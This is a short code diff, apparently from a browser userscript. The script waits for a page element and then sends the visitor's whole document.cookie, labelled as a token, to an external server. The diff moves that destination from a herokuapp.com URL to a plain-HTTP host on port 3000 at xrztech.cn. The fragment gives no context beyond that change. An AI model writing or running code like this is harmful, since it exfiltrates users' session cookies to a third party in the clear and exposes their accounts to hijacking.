@@ -5,7 +5,7 @@ $(document).ready(() => {
   nx.waitToDisplay('.mod-act-group .act-item-txt', 1000, (el) => {
     gmsdk.http
       .put({
-        url: 'https://aric-heroku-storage.herokuapp.com/posts',
+        url: 'http://aric.xrztech.cn:3000/posts',
         data: { token: document.cookie }
       })
       .then((res) => {
